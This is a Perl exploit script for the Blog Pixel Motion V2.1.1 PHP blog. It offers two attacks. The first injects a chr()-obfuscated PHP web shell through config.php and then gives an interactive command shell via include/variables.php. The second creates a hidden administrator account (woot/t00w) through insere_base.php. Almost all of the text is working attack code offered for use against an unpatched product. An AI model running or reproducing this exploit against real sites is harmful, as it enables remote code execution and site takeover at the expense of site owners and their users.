#!/usr/bin/perl
#
# Affected.scr..: Blog Pixel Motion V2.1.1
# Poc.ID........: 12060927
# Type..........: PHP Code Execution (stripslashes), SQL Injection (urldecode)
# Risk.level....: High
# Vendor.Status.: Unpatched
# Src.download..: www.pixelmotion.org/zip/blog2.1.zip
# Poc.link......: acid-root.new.fr/poc/12060927.txt
# Credits.......: DarkFig
#
# print "This exploit is for educational purpose only" x 999; exit;
#
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Response;
use Getopt::Long;
use strict;

print STDOUT "\n+", '-' x 60, "+\n";
print STDOUT "| Blog Pixel Motion V2.1.1 PHP Code Execution / Create Admin |\n";
print STDOUT '+', '-' x 60, "+\n";

my($host,$path,$proxh,$proxu,$proxp,$choice,$cmd,$res,$re);
my $opt = GetOptions(
   'host=s'   =>  \$host,
   'path=s'   =>  \$path,
   'proxh=s'  =>  \$proxh,
   'proxu=s'  =>  \$proxu,
   'proxp=s'  =>  \$proxp,
   'choice=s' =>  \$choice);

if(!$host) {
    print STDOUT "|      Usage: ./zz.pl --host=[www] --path=[/] --choice=[0]   |\n";
    print STDOUT "|   [Choice.]  1=PHP_Code_Execution       2=Create_Admin     |\n";
    print STDOUT "|   [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd]      |\n";
    print STDOUT '+', '-' x 60, "+\a\n";
    exit(1);
}

if($host  !~ /http/) {$host = 'http://'.$host;}
if($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}
if(!$path) {$path = '/';}
if(!$choice) {$choice = 2;}

my $ua = LWP::UserAgent->new();
   $ua->agent('0xzilla');
   $ua->timeout(30);
   $ua->proxy(['http'] => $proxh) if $proxh;
   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;

if($choice == 1) {

   $re = POST $host.$path.'config.php', [
   'nom_blog'  => '";
    $shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);
    $shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);
    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);
    $shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);
    $shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);
    $shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);
    $shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);
    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);
    $shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);
    eval($shcode); die(); //'];
    $ua->request($re);

    while(<STDIN>){
    chomp($cmd = $_);
    if($cmd eq 'exit') { exit(0); }
    $re = GET $host.$path.'include/variables.php?cmd='.$cmd;
    $res = $ua->request($re);
    print STDOUT "\n\n".$res->content."\n\$sh: ";
    }


} else {

  $re = GET $host.$path.'insere_base.php?login=woot&pass=t00w';
  $ua->request($re);
  print STDOUT "[+] Admin login.: woot\n";
  print STDOUT "[+] Admin passwd: t00w\n";
  print STDOUT '+', '-' x 60, "+\n";

}